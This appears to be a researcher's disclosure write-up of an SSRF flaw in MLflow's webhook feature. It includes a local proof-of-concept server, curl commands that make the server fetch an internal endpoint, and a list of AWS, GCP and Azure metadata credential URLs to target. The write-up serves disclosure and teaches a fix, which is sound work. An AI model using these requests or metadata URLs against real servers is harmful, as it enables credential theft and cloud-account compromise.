Some features are dangerous the moment they exist. A webhook is one of them: its entire job is to make your server send an HTTP request to a URL someone else chose. There is exactly one question that matters when you build one - do you check where it's allowed to point? MLflow shipped webhooks, and the answer was no.

So an authenticated user could hand the tracking server a URL and have it dial anywhere: your internal admin panel, a service on `127.0.0.1`, or the cloud metadata endpoint that hands out your instance's credentials.

## A feature that dials out

New outbound-request features are worth reading the day they land, precisely because the destination is the thing that needs a leash and it's easy to ship the feature without one. MLflow's webhooks have two halves, and I read both.

The first half stores the webhook. `_create_webhook()` in `mlflow/server/handlers.py` takes the user's `url` and saves it. That's it - no scheme check, no allowlist, nothing that would reject `http://169.254.169.254/`. It stores whatever string you give it.

The second half sends it. `_send_webhook_request()` in `mlflow/webhooks/delivery.py` takes that stored URL and issues an HTTP POST to it whenever the webhook is tested or triggered. It doesn't re-check either.

Put together: the create path trusts the URL, and the delivery path trusts the create path. Nobody ever actually looks at where the request is going.

## The trick is that you never touch the target

That's the whole shape of an SSRF, and it's worth saying plainly because it's what makes it powerful. The attacker never needs a route to the internal service. They only need the *server* to have one - and the server is already sitting inside the perimeter, behind the firewall, holding an IAM role. You're not asking to be let in. You're asking the thing that's already inside to fetch something for you.

## Watching it work

Here's a self-contained reproduction: a fake "internal service" on port 9000 that no outside attacker should be able to reach, and a minimal MLflow-shaped server with the same unvalidated create-then-fire flow.

```
from fastapi import FastAPI
from pydantic import BaseModel
import requests, json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import List
import uvicorn

# The internal service an attacker should NOT be able to reach directly
class InternalHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"""
        === INTERNAL ADMIN PANEL ===
        db_password: SuperSecretInternalPass
        api_key: INTERNAL_API_KEY_ABC123
        """)

threading.Thread(
    target=lambda: HTTPServer(("127.0.0.1", 9000), InternalHandler).serve_forever(),
    daemon=True
).start()

# The vulnerable MLflow-shaped server
app = FastAPI()
webhooks = {}

class WebhookCreateRequest(BaseModel):
    name: str
    url: str  # user-controlled, no validation
    events: List[str] = ["REGISTERED_MODEL_CREATED"]

class WebhookTestRequest(BaseModel):
    webhook_url: str

@app.post("/api/2.0/mlflow/webhooks/create")
async def create_webhook(webhook: WebhookCreateRequest):
    wid = f"webhook_{len(webhooks)+1}"
    webhooks[wid] = webhook.dict()      # stored as-is
    return {"webhook": webhooks[wid]}

@app.post("/api/2.0/mlflow/webhooks/test")
async def test_webhook(req: WebhookTestRequest):
    payload = json.dumps({"entity": "REGISTERED_MODEL", "action": "CREATED"})
    r = requests.post(req.webhook_url, data=payload, timeout=5)   # the SSRF
    return {"result": {"status": r.status_code, "body": r.text[:500]}}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)
```

Now play the attacker. Register a webhook pointed at the internal service:

```
curl -X POST http://127.0.0.1:8000/api/2.0/mlflow/webhooks/create \
  -H "Content-Type: application/json" \
  -d '{"name":"x","url":"http://127.0.0.1:9000/admin"}'
```

Then make the server fire it:

```
curl -X POST http://127.0.0.1:8000/api/2.0/mlflow/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"webhook_url":"http://127.0.0.1:9000/admin"}'
```

And the internal admin panel's response comes right back to you through MLflow:

```
db_password: SuperSecretInternalPass
api_key: INTERNAL_API_KEY_ABC123
```

Note that it's not even blind - the response body is reflected, so you read as well as reach.

## The addresses that actually matter

In a real deployment you don't point it at a demo. You point it at the endpoints every cloud quietly runs on `localhost`:

```
AWS metadata:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP metadata:   http://metadata.google.internal/computeMetadata/v1/
Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

MLflow on EC2 with an instance role now leaks that role's credentials, and cloud-account compromise follows from there. On GCP or Azure it's the same story with different URLs. On a corporate network it's internal recon and lateral movement instead. A tracking server became a pivot.

## The fix, and the rule it should have followed

Webhook destinations are now validated and allowlisted, with private, loopback and metadata ranges rejected - and, importantly, on *both* the create path and again before delivery. That "again" matters: validate-on-store alone is a classic way to leave a gap, because state can be changed between store and send. The rule for any feature that lets a user tell your server to make a request is the same rule as always - name what's allowed and refuse the rest, at the moment you actually make the call.

## Disclosure

Reported through huntr on February 10, 2026. Fixed upstream, published as CVE-2026-2393 (CWE-918), CVSS 7.1 - assigned to my report. Occurrences: `handlers.py` L3057, `delivery.py` L183. It rhymes with an earlier one, CVE-2025-52967, an SSRF in the MLflow gateway path - same class, different corner.
